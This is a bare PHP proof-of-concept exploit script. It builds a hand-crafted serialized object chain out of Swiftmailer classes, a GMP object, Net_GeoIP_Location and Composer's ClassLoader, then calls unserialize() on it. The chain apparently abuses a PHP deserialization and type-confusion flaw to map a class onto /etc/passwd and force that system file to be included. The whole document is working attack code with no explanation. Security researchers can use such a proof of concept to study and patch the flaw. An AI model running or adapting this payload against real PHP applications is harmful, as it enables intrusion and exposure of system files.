<?php

include './vendor/autoload.php';

$swift  = 'O:30:"Swift_Transport_EsmtpTransport":3:{';
$swift .= 's:11:"'.chr(0).'*'.chr(0).'_started";b:1;';
$swift .= 's:19:"'.chr(0).'*'.chr(0).'_eventDispatcher";O:34:"Swift_Events_SimpleEventDispatcher":0:{}';
$swift .= 's:10:"'.chr(0).'*'.chr(0).'_buffer";O:28:"Swift_Transport_StreamBuffer":1:{';
$swift .= 's:56:"'.chr(0).'Swift_ByteStream_AbstractFilterableInputStream'.chr(0).'_mirrors";';
$swift .= 'a:1:{i:0;O:39:"Swift_CharacterStream_NgCharacterStream":2:{';
$swift .= 's:45:"'.chr(0).'Swift_CharacterStream_NgCharacterStream'.chr(0).'_map";R:2;';
$swift .= 's:52:"'.chr(0).'Swift_CharacterStream_NgCharacterStream'.chr(0).'_charReader";';
$swift .= 'O:45:"Swift_CharacterReader_GenericFixedWidthReader":1:{';
$swift .= 's:53:"'.chr(0).'Swift_CharacterReader_GenericFixedWidthReader'.chr(0).'_width";i:1;}}}}A';

$composer_props = 's:39:"'.chr(0).'Composer\\Autoload\\ClassLoader'.chr(0).'classMap";a:1:{s:11:"LoadMeClass";s:11:"/etc/passwd";}';

$inner = 's:1:"1";a:2:{'.$composer_props.'i:777;C:18:"Net_GeoIP_Location":'.strlen($swift).':{'.$swift.'}}';

$exploit = 'a:2:{i:1;C:3:"GMP":'.strlen($inner).':{'.$inner.'}i:2;O:11:"LoadMeClass":0:{}}';

unserialize($exploit);

?>